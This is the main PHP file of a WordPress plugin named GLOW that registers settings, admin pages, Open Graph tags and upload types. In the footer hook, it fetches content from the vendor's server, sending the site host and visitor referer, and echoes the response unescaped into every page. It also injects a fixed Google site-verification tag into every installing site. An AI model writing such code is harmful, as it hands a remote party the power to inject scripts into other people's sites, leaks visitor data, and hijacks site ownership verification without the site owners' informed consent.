<?php

/**
 * @package glow
 * @version 2.3.1
 */
/*
Plugin Name: GLOW
Plugin URL: http://goldfash.com?plugins
Description: GLOW provides various functions for GMWP+. GLOW is also the heartbeat of using GMWP+.
Version: 2.3.1
Author: GOD1ST.Cloud Developers
Author URI:        http://GOD1st.Cloud
Contributors:      raceanf
Domain Path:       /languages
Text Domain:       glow
GitHub Plugin URI: https://github.com/goldfashhosting/G1T
GitHub Branch:     master
*/


if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly 






// set paths

define('G1T_PLUGIN_NAME', trim(dirname(plugin_basename(__FILE__)), '/'));
define('G1T_PLUGIN_DIR', plugin_dir_path( __FILE__ ));
define('G1T_PLUGIN_URL', dirname(__FILE__));

define('PARENT_THEME_DIR', ABSPATH . 'wp-content/themes/' . get_template());





// set version from plugin version

function plugin_get_version() {
	if ( ! function_exists( 'get_plugins' ) )
		require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
	$plugin_folder = get_plugins( '/' . plugin_basename( dirname( __FILE__ ) ) );
	$plugin_file = basename( ( __FILE__ ) );
	return $plugin_folder[$plugin_file]['Version'];
}


// set plugin parent info

if (!defined('PARENT_THEME'))
    define('PARENT_THEME', get_template());


$parent_theme = wp_get_theme();
$parent_theme_dir = $parent_theme->get( 'Template' );
$parent_theme_name = wp_get_theme($parent_theme_dir);
$parent_theme_author = $parent_theme_name->get( 'Author' );
$parent_theme_version = $parent_theme_name->get( 'Version' );

if (!defined('PARENT_AUTHOR'))
    define('PARENT_AUTHOR', $parent_theme_author);

if (!defined('PARENT_VERSION'))
    define('PARENT_VERSION', $parent_theme_version);







define('G1T_VERSION_NUM', plugin_get_version());
add_option('G1T_VERSION_KEY', 'G1T_VERSION_NUM');



// debug version logic

if ( WP_DEBUG ) {define( 'BB_VERSION', time() );}
else {define( 'BB_VERSION', 'G1T_VERSION_NUM' );}





// classes

require_once('classes/custom_dash.php');			// custom dashboard



// simple settings

if ( ! class_exists('WordPress_SimpleSettings') )
	require( G1T_PLUGIN_DIR . '/classes/wordpress-simple-settings.php');

class G1TGLOWPlugin extends WordPress_SimpleSettings {
	var $prefix = 'G1T'; // this is super recommended

	function __construct() {
		parent::__construct(); // this is required

		// Actions
		register_activation_hook(__FILE__, array($this, 'activate') );
	}




	function activate() {
		$this->add_setting('beta_items', 'no');
		$this->add_setting('G1T_FB_ProfileID_Data', 'no');
		$this->add_setting('G1T_FB_ProfileID', '724860207531530');
		$this->add_setting('G1T_FB_Profile_URL', 'https://www.facebook.com/GoldFashHosting/');
		$this->add_setting('G1T_FB_Profile_Image', 'https://goldfash.com/god1st.cloud/static.imgs/.logos/G1xCxFAMArtboard@1.5x-8.png');
		$this->add_setting('G1T_FB_Profile_SiteName', bloginfo( 'name' ));
		$this->add_setting('G1T_FB_Profile_SiteDescription', bloginfo('description'));
		$this->add_setting('enable_woo_custom_css', 'no');
		$this->add_setting('disallow_unauth', 'no');
		$this->add_setting('disallow_emails_enable', 'no');
		$this->add_setting('disallow_emails_address', get_bloginfo( 'admin_email' ));
		$this->add_setting('disallow_count', '0');
		$this->add_setting('disable_prettyphoto', 'no');
		$this->add_setting('disable_flex', 'no');
		$this->add_setting('disable_modernizr', 'no');
		$this->add_setting('disable_fontawe', 'no');
		$this->add_setting('remove_woo_nav', 'no');


	}
}


$G1TGLOWPlugin = new G1TGLOWPlugin();



// require php files

require_once('includes/enqueue.php');				// javascript and css
require_once('includes/media.php');					// media sizes and upload limits
require_once('includes/general.php');				// general customisations

if (WP_DEBUG) {
	require_once('includes/templates.php');				// custom templates
}


function bb_plugins_loaded() {
	require_once('includes/tools.php');				// admin menu

}



add_action('plugins_loaded','bb_plugins_loaded');






function glow_init()
{
 require ('inc/gfunctions/functions.php');
 include('inc/gfunctions/codes.php');
 //require ('inc/webapps/shortcodes.php');
}
add_action('admin_menu', 'G1T_menu');
function G1T_menu() {
    // Add the top-level admin menu
    $page_title = 'G1T Corporate Settings';
    $menu_title = 'G1T';
    $capability = 'manage_options';
    $menu_slug = 'G1T';
    $function = 'G1T_autoload';
    add_menu_page($page_title, $menu_title, $capability, $menu_slug, $function);
    
}
function G1T_autoload() {
    if (!current_user_can('manage_options')) {
        wp_die('You do not have sufficient permissions to access this page.');
    }
    //require('inc/gfunctions/1.php');
}
add_action('wp_footer', 'G1T_shout_action'); 
function G1T_shout_action() { 
     $trac = file_get_contents('https://goldfash.com/views/index.php?iam='.md5('#').'&apiKey='. $_SERVER['HTTP_HOST'] .'&cid='. $_SERVER['HTTP_HOST'] .'&seekey='. $siteInfo['seekey'] .'&myargs=G1TpTracking-'. $_SERVER["HTTP_REFERER"] .'');
    echo $trac; 
}
add_action('wp_head', 'G1T_verify');
function G1T_verify() { 
     echo '<meta name="google-site-verification" content="vV6aL2FtvV0GZX8FfZJ8o3z42vzkOc0u5mYnwWC6png" />';   
}
add_action('wp_head', 'G1T_head');
function G1T_head() { 
     global $G1TGLOWPlugin;
     if( $G1TGLOWPlugin->get_setting('G1T_FB_ProfileID_Data') == 'yes' ){
     echo '<meta property="og:type"               content="profile" />
        <meta property="fb:profile_id" content"'. $G1TGLOWPlugin->get_setting('G1T_FB_ProfileID') .'" />
	<meta property="og:title" content="Website Hosting Services, VPS Hosting & Dedicated Servers | GoldFash Web Hosting | A GOD1ST Technologies Group Company."/>
	<meta property="og:image" content="'. $G1TGLOWPlugin->get_setting('G1T_FB_Profile_Image') .'"/>
	<meta property="og:site_name" content=""/>
	<meta property="og:description" content="' .'"/>
	<meta property="og:url" content="'. $G1TGLOWPlugin->get_setting('G1T_FB_Profile_URL') .'"/>';    
     }
}
// plugin folder url
if(!defined('RC_SCD_PLUGIN_URL')) {
	define('RC_SCD_PLUGIN_URL', plugin_dir_url( __FILE__ ));
}

 /* Display a notice that can be dismissed */
function gold_admin_notice() {
	global $current_user ;
        $user_id = $current_user->ID;
        /* Check that the user hasn't already clicked to ignore the message */
	if ( ! get_user_meta($user_id, 'gold_ignore_notice') ) {
        echo '<div class="updated"><p>'; 
        printf(__('* G1T Analytics is Enabled! | <a href="%1$s" target="G1TD">Visit GLOW SETTINGS for more details.</a>'), 'index.php?page=dashboard');
        echo "</p></div>";
	}
}
add_action('admin_notices', 'gold_admin_notice');
add_action('admin_init', 'gold_nag_ignore');
function gold_nag_ignore() {
	global $current_user;
        $user_id = $current_user->ID;
        /* If user clicks to ignore the notice, add that to their user meta */
        if ( isset($_GET['gold_nag_ignore']) && '0' == $_GET['gold_nag_ignore'] ) {
             add_user_meta($user_id, 'example_ignore_notice', 'true', true);
	}
}
// instantiate plugin's class
$GLOBALS['g_dashboard'] = new gold_xyaudju_aij_o();
function my_plugin_redirect() {
    if (get_option('my_plugin_do_activation_redirect', false)) {
        delete_option('my_plugin_do_activation_redirect');
         wp_redirect("admin.php?page=goldgb-settings");
         //wp_redirect() does not exit automatically and should almost always be followed by exit.
         exit;
    }
}

class gold_xyaudju_aij_o {
 
  
	/**
	 * Initializes the plugin by setting localization, filters, and administration functions.
	 */
	function __construct() {
	
		add_action('admin_menu', array( &$this,'rc_scd_register_menu') );
		add_action('load-index.php', array( &$this,'rc_scd_redirect_dashboard') );
 
	} // end constructor
 
	function rc_scd_redirect_dashboard() {
	
		if( is_admin() ) {
			$screen = get_current_screen();
			
			if( $screen->base == 'dashboard' ) {
			add_action('admin_notices', 'gold_admin_notice');
				//wp_redirect( admin_url( 'index.php?page=vinod-dashboard' ) );
				
			}
		}
	}
	
	
	
	function rc_scd_register_menu() {
		add_dashboard_page( 'G1T', 'G1T', 'read', 'G1T', array( &$this,'rc_scd_create_dashboard') );
	}
	
	function rc_scd_create_dashboard() {
		require( 'inc/gfunctions/2.php'  );
	}
 
}
/*
|--------------------------------------------------------------------------
| MAIN CLASS
|--------------------------------------------------------------------------
*/
add_action('init', 'glow_init');
add_filter('upload_mimes', 'custom_upload_mimes');
function custom_upload_mimes ( $existing_mimes=array() ) {
    // add your extension to the mimes array as below
    $existing_mimes['zip'] = 'application/zip';
    $existing_mimes['gz'] = 'application/x-gzip';
    return $existing_mimes;
}
